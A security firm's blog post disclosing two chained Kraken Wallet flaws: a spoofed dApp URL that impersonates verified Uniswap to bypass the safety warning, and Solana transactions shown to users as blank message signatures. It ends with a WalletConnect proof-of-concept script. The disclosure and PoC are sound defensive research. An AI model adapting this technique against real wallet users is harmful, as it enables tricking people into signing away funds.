---
schema_version: "1.0.0"
document_id: "dba864c90fe90272f6cbd6925be24b4e7c10c1c736837873587fc23de5c2ab3b"
company_key: "yc-veria-labs"
company: "Veria Labs"
source_id: "yc-veria-labs-rss-80fd8934189a"
canonical_url: "https://verialabs.com/blog/securing-open-source-part-2-cracking-kraken/"
published_at: "2026-04-10T00:00:00+00:00"
first_seen_at: "2026-07-20T23:20:58.723115+00:00"
fetched_at: "2026-07-28T22:00:15.315546+00:00"
content_hash: "sha256:ee91e87335560face006855fe6bebf2bfcfc3d5f55936c69a2e3a94d8316a65f"
---

# Securing Open Source Part 2: Cracking Kraken

**Securing Open Source** Cracking Kraken


krakenfx/ **wallet**


Apr 10, 2026


#open-source


For Part 2 of our Securing Open Source series, we pointed the Veria AI at[Kraken Wallet](https://github.com/krakenfx/wallet) .


## TL;DR


- A malicious dApp can impersonate a verified dApp, bypassing Kraken’s malicious dApp warning.
- Solana dApp transactions can be disguised as a message sign instead of a transaction sign


## What is Kraken Wallet?


Kraken Wallet is a self-custody mobile app for iOS and Android, separate from Kraken’s main exchange apps (Kraken, Kraken Pro, and Krak). The wallet supports multiple chains including Bitcoin, Ethereum, Solana, Polygon, etc letting users store crypto, NFTs, and other DeFi operations. For dApp connectivity it relies on WalletConnect, which is where the vulnerabilities we found come in. It’s a fully non-custodial wallet which allows users to be in full control of their private key.


Notably, Kraken Wallet is open source with its codebase available on GitHub.


## Vulnerability Analysis


We’ll cover each bug individually and how they were chained together to make the full exploit chain. Kraken Wallet had 2 security issues:


### Verified dApp Impersonation


The` handleSessionProposal` determines which URL to analyze for safety. It prefers the verified origin but falls back to the` metadata.url` provided by the dApp itself if the verified origin is null.


modules/wallet-connect/web3Wallet/handleSessionProposal.ts


```text
31   const     url     =   proposal?.verifyContext?.verified?.origin   ??   proposal.params.proposer.metadata.url;    32   // ...    33   const     analyseUrlResult     =     await     analyseUrl  (url, allAccounts);
```


So, any new dApp created via WalletConnect or another dApp maker can change their metadata to a verified dApp provider from Kraken. For the PoC, we chose Uniswap` https://app.uniswap.org` .


Since the verified origin is null, the application passes the legitimate Uniswap URL to` analyseUrl` . This function correctly reports that Uniswap is safe (` isMalicious: false` ).


### Transactions Disguised as Messages


The wallet signs messages without domain separation. The function decodes a base58 input string and signs the raw bytes directly.


src/onChain/wallets/solana.ts


```text
310        async   signMessage  (data: WalletDataWithSeed, message: string):   Promise  <  {   signature  : string }  >   {    311          const keyPair   =     await     this  .  getKeypair  (data);    312          const signature   =   nacl.sign.  detached  (bs58.  decode  (message), keyPair.secretKey);    313
314          return {   signature  : bs58.  encode  (signature) };    315        }
```


You can create a transaction with a transaction instruction inside. Then, base58 encode it before passing it into signMessage through the dApp. When the user interacts with the transaction, the Kraken UI renders the transaction as a message instead of a transfer.


## Impact


By chaining both vulnerabilities together, an attacker can effectively create a verified dApp that steals a targeted users funds if they sign a “message.”


First, when connecting to the dApp through Kraken, the spoofed URL in the dApp metadata fully bypasses the “App safety not verified” warning.


Then, when a request is sent from the dApp for the transfer transaction, the Kraken Wallet app displays a “Sign Message” prompt with a blank message instead of displaying a “Contract Interaction” along with the transaction bytes for verification.


## Remediation & Kraken Response


Both bugs were reported as a single vulnerability to the Kraken team on 03-18-2026. Within 24 hours, the Kraken team had confirmed its validity. Unfortunately for the bug bounty, this was flagged as a duplicate and was ineligible for a payout.


## Closing Thoughts


While this isn’t a high or critical severity finding, the exploit chain still demonstrates risk. A user could be tricked into signing a transfer transaction through what appears to be a message from a verified dApp. It’s a good reminder that even small issues can compound into bigger threats when chained together.


We’ll continue publishing findings from our agent in this series. If you want to know what vulnerabilities are sitting in your codebase, book a[call](https://verialabs.com/contact) .


## Timeline


- 03/17/2026 - Veria AI ran on Kraken Wallet
- 03/17/2026 - Veria AI finds and verifies both vulnerabilities
- 03/18/2026 - Reported to Kraken Security Team
- 03/18/2026 - Kraken confirms internal duplicate finding
- ??/??/2026 - Both vulnerabilities are patched


It is unknown exactly when this bug was patched, but we can assume it was fixed sometime in between 03/18/2026 and 04/08/2026.


## PoC


```text
1   import   readline   from     "node:readline/promises"  ;    2   import   { stdin   as   input, stdout   as   output }   from     "node:process"  ;    3   import   { inspect }   from     "node:util"  ;    4
5   import     *     as   SignClientPkg   from     "@walletconnect/sign-client"  ;    6   import   bs58   from     "bs58"  ;    7   import   qrcode   from     "qrcode-terminal"  ;    8   import   { Connection, PublicKey, SystemProgram, TransactionMessage, VersionedTransaction }   from     "@solana/web3.js"  ;    9
10   const     PROJECT_ID     =     "166e072e1ac6c2d9ad7caad68fc69e90"  ;    11   const     CHAIN_ID     =   process.env.  SOLANA_CHAIN_ID     ||     "solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp"  ;    12   const     RPC_URL     =   process.env.  SOLANA_RPC_URL     ||     "https://api.mainnet-beta.solana.com"  ;    13
14   if   (  !  PROJECT_ID  ) {    15        console.  error  (  "Missing WALLETCONNECT_PROJECT_ID env var."  );    16        process.  exit  (  1  );    17   }    18
19   function     parseAccount  (  accountString  ) {    20       const   [  namespace  ,   reference  ,   address  ]   =   accountString.  split  (  ":"  );    21       return   { namespace, reference, address };    22   }    23
24   function     resolveSignClient  () {    25       const     SignClient     =   SignClientPkg?.SignClient   ||   SignClientPkg?.default?.SignClient   ||   SignClientPkg?.default;    26       if   (  !  SignClient   ||     typeof   SignClient.init   !==     "function"  ) {    27         throw     new     Error  (  "Unable to resolve SignClient.init from @walletconnect/sign-client"  );    28        }    29       return   SignClient;    30   }    31
32   function     buildTxVariants  (  owner  ,   blockhash  ) {    33       const     ixs     =   [    34          SystemProgram.  transfer  ({    35            fromPubkey: owner,    36            toPubkey: owner,    37            lamports:   1  ,    38          }),    39        ];    40
41       const     messageV0     =     new     TransactionMessage  ({    42          payerKey: owner,    43          recentBlockhash: blockhash,    44          instructions: ixs,    45        }).  compileToV0Message  ();    46       const     v0tx     =     new     VersionedTransaction  (messageV0);    47       const     v0wire     =   Buffer.  from  (v0tx.  serialize  ());    48
49       const     base64Params     =   { transaction: v0wire.  toString  (  "base64"  ) };    50       const     base58Params     =   { transaction: bs58.  encode  (v0wire) };    51
52       return   [    53          { label:   "object/base64"  , params: base64Params },    54          { label:   "array[object]/base64"  , params: [base64Params] },    55          { label:   "object/base58"  , params: base58Params },    56          { label:   "array[object]/base58"  , params: [base58Params] },    57        ];    58   }    59
60   async     function     requestSignTransaction  (  client  ,   topic  ,   chainId  ,   variants  ) {    61       let   lastError;    62       for   (  const     variant     of   variants) {    63         try   {    64            console.  log  (  `Trying variant: ${  variant  .  label  }`  );    65           const     result     =     await   client.  request  ({    66              topic,    67              chainId,    68              request: {    69                method:   "solana_signTransaction"  ,    70                params: variant.params,    71              },    72            });    73           return   { variant: variant.label, result };    74          }   catch   (error) {    75            lastError   =   error;    76            console.  log  (  `Variant failed: ${  variant  .  label  }`  );    77            console.  log  (  inspect  (error, { depth:   6  , showHidden:   true   }));    78          }    79        }    80       throw   lastError   ??     new     Error  (  "All signTransaction variants failed"  );    81   }    82
83   async     function     main  () {    84       const     rl     =   readline.  createInterface  ({ input, output });    85       const     connection     =     new     Connection  (  RPC_URL  ,   "confirmed"  );    86       const     SignClient     =     resolveSignClient  ();    87
88       const     client     =     await   SignClient.  init  ({    89          projectId:   PROJECT_ID  ,    90          metadata: {    91            name:   "WC Solana direct signTransaction PoC"  ,    92            description:   "PoC for direct solana_signTransaction request"  ,    93            url:   "https://thisshiiskindacrazy.org"  ,    94            icons: [  "https://walletconnect.com/walletconnect-logo.png"  ],    95          },    96        });    97
98       const     optionalNamespaces     =   {    99          solana: {    100            methods: [  "solana_signTransaction"  ,   "solana_signMessage"  ],    101            chains: [  CHAIN_ID  ],    102            events: [],    103          },    104        };    105
106       const   {   uri  ,   approval   }   =     await   client.  connect  ({ optionalNamespaces });    107       if   (uri) {    108          console.  log  (  "  \n  Scan this QR with Kraken Wallet:  \n  "  );    109          qrcode.  generate  (uri, { small:   true   });    110          console.  log  (  "  \n  Pairing URI:  \n  "  , uri,   "  \n  "  );    111        }    112
113        console.  log  (  "Waiting for wallet approval..."  );    114       const     session     =     await     approval  ();    115       const     accounts     =   session.namespaces?.solana?.accounts   ??   [];    116       if   (accounts.  length     ===     0  ) {    117         throw     new     Error  (  "No Solana account in approved session."  );    118        }    119
120       const     chosen     =   accounts.  find  (  a     =>   a.  startsWith  (  `${  CHAIN_ID  }:`  ))   ||   accounts[  0  ];    121       const   {   namespace  ,   reference  ,   address   }   =     parseAccount  (chosen);    122       const     chainId     =     `${  namespace  }:${  reference  }`  ;    123       const     owner     =     new     PublicKey  (address);    124       const   {   blockhash   }   =     await   connection.  getLatestBlockhash  (  "confirmed"  );    125
126        console.  log  (  "Session approved:"  , session.topic);    127        console.  log  (  "Session methods:"  , session.namespaces?.solana?.methods   ??   []);    128        console.  log  (  "Session chains:"  , session.namespaces?.solana?.chains   ??   []);    129        console.  log  (  "Using account:"  , chosen);    130        console.  log  (  "RPC:"  ,   RPC_URL  );    131        console.  log  (  "Balance (lamports):"  ,   await   connection.  getBalance  (owner,   "confirmed"  ));    132        console.  log  (  "Blockhash:"  , blockhash);    133
134       const     variants     =     buildTxVariants  (owner, blockhash);    135
136       await   rl.  question  (  "  \n  Press Enter to request solana_signTransaction..."  );    137       const   {   variant  ,   result   }   =     await     requestSignTransaction  (client, session.topic, chainId, variants);    138
139        console.  log  (  "  \n  Success."  );    140        console.  log  (  "Accepted variant:"  , variant);    141        console.  log  (  "Response:"  , result);    142
143       await   rl.  question  (  "  \n  Press Enter to disconnect..."  );    144       await   client.  disconnect  ({    145          topic: session.topic,    146          reason: { code:   6000  , message:   "PoC complete"   },    147        });    148        rl.  close  ();    149   }    150
151   main  ().  catch  (  error     =>   {    152        console.  error  (  "  \n  Fatal error:"  , error);    153        process.  exit  (  1  );    154   });
```


## About Us


At Veria Labs, we build AI pentesting agents that automatically find and fix security vulnerabilities in your application. Founded by members of the #1 competitive hacking team in the U.S., we’ve found critical vulnerabilities in every company we’ve worked with, from small startups to enterprise giants.


Think we can help secure your systems? We’d love to chat! Book a call[here](https://verialabs.com/contact) .
